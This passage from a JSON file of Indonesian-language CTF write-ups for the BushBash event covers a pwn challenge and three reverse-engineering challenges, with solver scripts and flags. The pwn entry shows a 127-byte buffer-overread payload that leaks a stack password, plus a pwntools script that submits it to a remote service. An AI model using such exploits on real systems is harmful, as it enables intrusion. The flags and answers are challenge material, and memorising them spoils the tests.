        "content": "Payload yang dikirim:\n\n```python\nb\"A\" * 127\n```\n\nOutput service:\n\n```text\npassword you entered:\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nGNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a\n```\n\nPassword berhasil bocor:\n\n```text\nGNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a\n```\n\n---"
      },
      {
        "title": "Final Exploit",
        "content": "Setelah password diketahui, tahap berikutnya hanya perlu mengirim password tersebut ke service.\n\n```python\nfrom pwn import *\n\nHOST = \"34.40.133.67\"\nPORT = 7778\n\npassword = b\"GNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a\"\n\nio = remote(HOST, PORT)\n\nio.recvuntil(b\"Enter the password: \")\n\nio.sendline(password)\n\nprint(io.recvall().decode())\n```\n\n---"
      },
      {
        "title": "Output",
        "content": "```text\nI knew I can count on you!\nChasing 'em down, and see you on the flip side.\n\nbushbash{1nto-th3-bUsh-w3-Go}\n```\n\n---"
      },
      {
        "title": "Alur Eksploit",
        "content": "```text\nKirim 127 byte\n        │\n        ▼\nBuffer terisi penuh\n        │\n        ▼\nTidak ada NULL terminator\n        │\n        ▼\nprintf(\"%s\")\nmembaca melewati buffer\n        │\n        ▼\nPassword pada stack ikut tercetak\n        │\n        ▼\nLogin menggunakan password asli\n        │\n        ▼\nFlag diperoleh\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "bushbash{1nto-th3-bUsh-w3-Go}",
    "lessonsLearned": ""
  },
  {
    "id": "bushbash-rev-langleranglelanglerangle",
    "title": "<><>",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "BushBash",
    "tags": [],
    "description": "# <><>",
    "problemDescription": "`out.cpp` menyimpan pesan yang dihapus sebagai 214 parameter `FLAGMESSAGE`.\nSetiap parameter dipakai sebagai `FlagValue<N>::Value` dalam constraint template\nC++, sehingga suatu pengganti pesan yang benar harus membuat seluruh constraint\nvalid saat dikompilasi.",
    "tools": [],
    "analysis": "Template `Equ<c1,c2,t1,v1,v2,v3,v4,v5>` menyatakan:\n\n```text\nc1*v1 + c2*v2 + t1*v3 = v4 + v5\n```\n\nPersamaan `Equ` bersifat homogen. Matriks 700Ã—214 yang dibentuk dari persamaan\ntersebut memiliki rank 213, jadi nullspace-nya satu dimensi. Nilai karakter\nadalah suatu skala integer dari vektor nullspace; constraint `Lt`, `Lteq`,\n`Gt`, `Gteq`, dan `Divides` menentukan skala yang valid.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `out.cpp` â€” sumber C++ yang berisi 700 persamaan linear dan 881 constraint\n  pembanding/divisibilitas.\n- `solve.py` â€” solver reproduksibel."
      },
      {
        "title": "Solusi",
        "content": "Jalankan pada virtual environment challenge:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nSolver menghitung SVD, menguji skala integer, dan kemudian mengevaluasi semua\n1.581 constraint dari `out.cpp`. Satu-satunya skala yang lolos adalah 67,\nyang mendekodekan pesan dan flag berikut."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Recover the deleted FLAGMESSAGE values from C++ template constraints.\"\"\"\r\n\r\nimport re\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\n\r\n\r\nSOURCE = Path(__file__).with_name(\"out.cpp\")\r\nCOUNT = 214\r\n\r\n\r\ndef equations(source: str) -> np.ndarray:\r\n    \"\"\"Convert every Equ<c1,c2,t1,v1,v2,v3,v4,v5> into one row of Ax=0.\"\"\"\r\n    pattern = re.compile(\r\n        r\"using Constraint_\\d+ = Equ<\\s*(-?\\d+),\\s*(-?\\d+),\\s*(-?\\d+),\\s*\"\r\n        r\"FlagValue<(\\d+)>::Value,\\s*FlagValue<(\\d+)>::Value,\\s*\"\r\n        r\"FlagValue<(\\d+)>::Value,\\s*FlagValue<(\\d+)>::Value,\\s*\"\r\n        r\"FlagValue<(\\d+)>::Value\\s*>;\"\r\n    )\r\n    rows = []\r\n    for c1, c2, t1, v1, v2, v3, v4, v5 in pattern.findall(source):\r\n        row = np.zeros(COUNT)\r\n        for index, coefficient in zip(\r\n            (v1, v2, v3, v4, v5), (c1, c2, t1, \"-1\", \"-1\")\r\n        ):\r\n            row[int(index)] += int(coefficient)\r\n        rows.append(row)\r\n    if len(rows) != 700:\r\n        raise ValueError(f\"expected 700 Equ constraints, found {len(rows)}\")\r\n    return np.array(rows)\r\n\r\n\r\ndef check_constraints(source: str, values: np.ndarray) -> None:\r\n    \"\"\"Evaluate every original constraint after substituting recovered values.\"\"\"\r\n    pattern = re.compile(r\"using Constraint_(\\d+) = (\\w+)<(.+)>;\")\r\n    for number, kind, arguments in pattern.findall(source):\r\n        args = re.sub(r\"FlagValue<(\\d+)>::Value\", r\"values[\\1]\", arguments)\r\n        parts = [eval(part, {\"values\": values}) for part in args.split(\", \")]\r\n        if kind == \"Equ\":\r\n            valid = parts[0] * parts[3] + parts[1] * parts[4] + parts[2] * parts[5] == parts[6] + parts[7]\r\n        elif kind == \"Divides\":\r\n            valid = parts[0] % parts[1] == 0\r\n        else:\r\n            left, right = parts\r\n            valid = {\"Lt\": left < right, \"Lteq\": left <= right,\r\n                     \"Gt\": left > right, \"Gteq\": left >= right}[kind]\r\n        if not valid:\r\n            raise ValueError(f\"Constraint_{number} ({kind}) failed\")\r\n\r\n\r\ndef main() -> None:\r\n    source = SOURCE.read_text()\r\n    # The 700 homogeneous equations have rank 213, so SVD gives their one-dimensional\r\n    # nullspace.  Try possible integer scale factors and retain the one satisfying all\r\n    # inequality and divisibility constraints.\r\n    _, _, right_vectors = np.linalg.svd(equations(source), full_matrices=False)\r\n    direction = right_vectors[-1] / right_vectors[-1][0]\r\n    for scale in range(1, 256):\r\n        candidate = np.rint(direction * scale).astype(int)\r\n        if not np.allclose(direction * scale, candidate, atol=1e-6):\r\n            continue\r\n        try:\r\n            check_constraints(source, candidate)\r\n        except ValueError:\r\n            continue\r\n        message = \"\".join(map(chr, candidate))\r\n        flag = re.search(r\"\\b\\w+\\{[^}]+\\}\", message)\r\n        if not flag:\r\n            raise ValueError(\"valid message did not contain a flag\")\r\n        print(message)\r\n        print(flag.group())\r\n        return\r\n    raise ValueError(\"no integer scale satisfied all constraints\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bushbash{d1d_y0U_Us3_z3?}",
    "lessonsLearned": ""
  },
  {
    "id": "bushbash-rev-langleranglelangleranglelangleranglelangleranglelangleranglelanglerangle",
    "title": "<><><><><><>",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "BushBash",
    "tags": [],
    "description": "# <><><><><><>",
    "problemDescription": "File C++ tidak membaca input. Ia memakai template metaprogramming sebagai interpreter saat kompilasi untuk mengenkripsi 18 byte yang diletakkan pada alias `KVRP`.",
    "tools": [],
    "analysis": "Kedua artefak adalah source ASCII. `main.cpp` mencetak `output`, sedangkan header memuat key sebagai `GEUE` dan komentar pada `KVRP`: `This is where the flag should go if you were encrypting it.`\n\n`IDXV<N>` menyimpan integer sebagai type. `OWRC` adalah linked list dan `TWDL` mengambil elemen list berdasarkan indeks. `CWCE` menjalankan instruksi-instruksi encoded sebagai type:\n\n- `JLLV` menyimpan nilai ke variabel.\n- `HPFP<..., 16>` mengulang blok internal sebanyak 16 kali.\n- `HPFP<..., 9>` memproses sembilan pasangan byte.\n- `QVTC`, `EPMS`, `KZRJ`, dan `RCOB` masing-masing adalah XOR, tambah, kali, dan modulo.\n\nDi blok 16 ronde, `SMSW` dihitung sebagai `key[i] * WVTF + WVTF`, lalu `ZCHU` menghasilkan:\n\n```text\nF(R) = ((R + (key[i] * state + state)) * 17) % 135\n```\n\nInstruksi berikutnya menulis `RLGL = FNHJ` dan `FNHJ = RLGL_lama XOR F(R)`, sehingga satu ronde adalah Feistel:\n\n```text\n(L, R) -> (R, L XOR F(R))\n```\n\nSetelah 16 ronde, `state` (`WVTF`) ditambah `L + R`. State awalnya `1`. Ciphertext dikumpulkan pada `AXEK` dan urutan `BCAD<17>` hingga `BCAD<0>` membuatnya kembali ke urutan pasangan asli.\n\nMengompilasi source dengan `g++ -std=c++17 -O2 main.cpp` saat `KVRP` berisi nol menghasilkan awalan output `86,144,...`. Simulasi forward dari ronde di atas untuk pasangan nol dan state `1` menghasilkan pasangan awal yang sama. Semua ciphertext challenge juga direproduksi oleh verifikasi dalam solver.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `main.cpp`: mencetak hasil kalkulasi compile-time.\n- `<><><><><><>.hpp`: interpreter template, key, slot plaintext, dan array `output`."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Untuk membalik ronde Feistel, ciphertext `(L', R')` diproses dengan key terbalik:\n\n```text\n(L, R) = (R' XOR F(L'), L')\n```\n\nState untuk pasangan berikutnya tetap memakai ciphertext yang baru selesai diproses, yaitu `state += L' + R'`."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membalik setiap pasangan ciphertext, menyusun 18 byte plaintext, lalu mengenkripsi ulang hasilnya. Assertion memastikan ciphertext hasil enkripsi ulang identik dengan array challenge."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```"
      },
      {
        "title": "Catatan",
        "content": "Tidak ada aktivitas network atau artefak di luar direktori challenge. Flag diperoleh dari inversi algoritma yang sama dan diverifikasi dengan enkripsi ulang."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Membalikkan enkripsi template C++ challenge secara langsung.\"\"\"\r\n\r\nKEY = [10, 21, 99, 4, 534, 24, 63, 57, 102, 38, 0, 123, 53, 674, 12, 57]\r\nCIPHERTEXT = [221, 75, 97, 125, 30, 124, 51, 122, 15, 186, 39, 46, 74, 175, 120, 83, 219, 165]\r\n\r\n\r\ndef round_function(right: int, key_byte: int, state: int) -> int:\r\n    \"\"\"ZCHU: ((right + (key_byte * state + state)) * 17) % 135.\"\"\"\r\n    return ((right + key_byte * state + state) * 17) % 135\r\n\r\n\r\ndef decrypt_pair(left: int, right: int, state: int) -> tuple[int, int]:\r\n    # Enkripsi: (L, R) -> (R, L ^ F(R)); balikkan dalam urutan key terbalik.\r\n    for key_byte in reversed(KEY):\r\n        left, right = right ^ round_function(left, key_byte, state), left\r\n    return left, right\r\n\r\n\r\ndef encrypt_pair(left: int, right: int, state: int) -> tuple[int, int]:\r\n    for key_byte in KEY:\r\n        left, right = right, left ^ round_function(right, key_byte, state)\r\n    return left, right\r\n\r\n\r\ndef main() -> None:\r\n    state = 1\r\n    plaintext = []\r\n    verification = []\r\n\r\n    for cipher_left, cipher_right in zip(CIPHERTEXT[::2], CIPHERTEXT[1::2]):\r\n        plain_left, plain_right = decrypt_pair(cipher_left, cipher_right, state)\r\n        plaintext.extend((plain_left, plain_right))\r\n        verification.extend(encrypt_pair(plain_left, plain_right, state))\r\n        state += cipher_left + cipher_right\r\n\r\n    assert verification == CIPHERTEXT\r\n    print(f\"<FLAG>{bytes(plaintext).decode('ascii')}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bushbash{ma5B3_sf1NAe_neXt?}",
    "lessonsLearned": ""
  },
  {
    "id": "bushbash-rev-turnaround",
    "title": "Turned Around",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "BushBash",
    "tags": [],
    "description": "Writeup for challenge Turned Around",
    "problemDescription": "Deskripsi challenge menyebutkan bahwa sebuah perangkat terinfeksi malware dan password root kemungkinan masih tersimpan di dalam source code.\n\nMenjalankan program secara normal hanya menghasilkan pesan:\n\n```text\nNice try! Unfortunately it's not that easy...\n```\n\nKarena output tersebut jelas merupakan umpan, password harus dicari melalui analisis source.\n\n---",
    "tools": [],
    "analysis": "Brainfuck hanya memiliki delapan instruksi:\n\n```text\n>\n<\n+\n-\n.\n,\n[\n]\n```\n\nSetelah membersihkan file dari karakter selain instruksi Brainfuck, terlihat bahwa program **tidak menggunakan instruksi input `,`**.\n\nArtinya program tidak pernah membaca input pengguna sehingga password tidak mungkin diperiksa saat runtime. Dengan demikian password kemungkinan besar sudah tertanam langsung di dalam source.\n\n---\n\n### Rekonstruksi Password\n\nKedua bagian digabungkan:\n\n```text\n(d0Ub13*\n+\n-*b4ck!\n```\n\nHasil akhirnya:\n\n```text\n(d0Ub13*-*b4ck!\n```\n\nSehingga flag menjadi:\n\n```text\nbushbash{(d0Ub13*-*b4ck!}\n```\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "| Field | Value |\n|-------|-------|\n| **Kategori** | Reverse Engineering |\n| **Judul** | Turned Around |\n| **Artifact** | `turnedaround.bf` |\n| **Format Flag** | `bushbash{password}` |\n\n---"
      },
      {
        "title": "Mencari Cabang Mati",
        "content": "Source mengandung beberapa blok seperti:\n\n```brainfuck\n[]\n```\n\ndan\n\n```brainfuck\n[\n    ...\n]\n```\n\nPada Brainfuck, loop memiliki perilaku:\n\n```text\n[\n    ...\n]\n```\n\nakan dijalankan **hanya jika sel saat ini bernilai bukan nol**.\n\nKarena tape Brainfuck selalu diawali dengan nilai nol, seluruh blok tersebut langsung dilewati.\n\nDengan kata lain, isi loop merupakan **dead code** yang tidak pernah dieksekusi pada jalur normal.\n\n---"
      },
      {
        "title": "Mengeksekusi Isi Loop",
        "content": "Setiap body loop diekstrak menjadi program Brainfuck tersendiri kemudian dijalankan menggunakan interpreter sederhana.\n\nSebagian besar loop tidak menghasilkan apa pun, tetapi dua di antaranya mencetak string yang dapat dibaca.\n\nOutput pertama:\n\n```text\nCore Dumped!\nRecovered partial password:\n\n(d0Ub13*_______\n```\n\nBagian password yang diperoleh:\n\n```text\n(d0Ub13*\n```\n\n---\n\nOutput kedua:\n\n```text\nTODO:\nRemove this note where I hide half my hidden password:\n\n________-*b4ck!\n```\n\nBagian password kedua:\n\n```text\n-*b4ck!\n```\n\n---"
      },
      {
        "title": "Solver",
        "content": "```python\n#!/usr/bin/env python3\n\nimport re\nimport sys\n\nBF_CHARS = set(\"><+-.,[]\")\n\n\ndef clean_bf(src):\n    return \"\".join(c for c in src if c in BF_CHARS)\n\n\ndef build_bracket_map(code):\n    stack = []\n    pair = {}\n\n    for i, c in enumerate(code):\n        if c == \"[\":\n            stack.append(i)\n\n        elif c == \"]\":\n            if not stack:\n                raise ValueError(\"Unmatched ]\")\n\n            j = stack.pop()\n            pair[i] = j\n            pair[j] = i\n\n    if stack:\n        raise ValueError(\"Unmatched [\")\n\n    return pair\n\n\ndef run_bf(code):\n    pair = build_bracket_map(code)\n\n    tape = [0] * 30000\n    ptr = 0\n    pc = 0\n\n    out = []\n\n    while pc < len(code):\n        op = code[pc]\n\n        if op == \">\":\n            ptr += 1\n            if ptr >= len(tape):\n                tape.append(0)\n\n        elif op == \"<\":\n            ptr -= 1\n\n        elif op == \"+\":\n            tape[ptr] = (tape[ptr] + 1) & 0xff\n\n        elif op == \"-\":\n            tape[ptr] = (tape[ptr] - 1) & 0xff\n\n        elif op == \".\":\n            out.append(chr(tape[ptr]))\n\n        elif op == \",\":\n            tape[ptr] = 0\n\n        elif op == \"[\":\n            if tape[ptr] == 0:\n                pc = pair[pc]\n\n        elif op == \"]\":\n            if tape[ptr] != 0:\n                pc = pair[pc]\n\n        pc += 1\n\n    return \"\".join(out)\n\n\ndef printable(text):\n    if not text:\n        return False\n\n    ok = sum(\n        c in \"\\n\\r\\t\" or 32 <= ord(c) < 127\n        for c in text\n    )\n\n    return ok / len(text) > 0.85\n\n\ndef main():\n    if len(sys.argv) != 2:\n        print(f\"Usage: {sys.argv[0]} turnedaround.bf\")\n        return\n\n    with open(sys.argv[1]) as f:\n        code = clean_bf(f.read())\n\n    pair = build_bracket_map(code)\n\n    print(\"[+] Normal output\")\n    print(run_bf(code))\n\n    outputs = []\n\n    for start in sorted(i for i, c in enumerate(code) if c == \"[\"):\n        end = pair[start]\n        block = code[start + 1:end]\n\n        try:\n            result = run_bf(block)\n        except Exception:\n            continue\n\n        if printable(result):\n            outputs.append(result.strip())\n\n    joined = \"\\n\".join(outputs)\n\n    left = re.search(\n        r\"Recovered partial password:\\s*([^\\s_]+)_+\",\n        joined,\n    )\n\n    right = re.search(\n        r\"hidden password:\\s*_+([^\\s]+)\",\n        joined,\n    )\n\n    password = left.group(1) + right.group(1)\n\n    print()\n    print(\"[+] Password:\", password)\n    print(\"[+] Flag:\", f\"bushbash{{{password}}}\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n---"
      },
      {
        "title": "Menjalankan Solver",
        "content": "```bash\npython3 solver.py turnedaround.bf\n```\n\nOutput:\n\n```text\n[+] Password:\n(d0Ub13*-*b4ck!\n\n[+] Flag:\nbushbash{(d0Ub13*-*b4ck!}\n```\n\n---"
      },
      {
        "title": "Alur Penyelesaian",
        "content": "```text\nProgram Brainfuck\n        │\n        ▼\nEksekusi normal\n        │\n        ▼\nHanya mencetak pesan palsu\n        │\n        ▼\nAnalisis source\n        │\n        ▼\nMenemukan loop yang tidak pernah dieksekusi\n        │\n        ▼\nEkstrak isi setiap loop\n        │\n        ▼\nJalankan sebagai program Brainfuck terpisah\n        │\n        ▼\nDapat dua potongan password\n        │\n        ▼\nGabungkan password\n        │\n        ▼\nPeroleh flag\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "bushbash{(d0Ub13*-*b4ck!}",
    "lessonsLearned": ""
  }
];
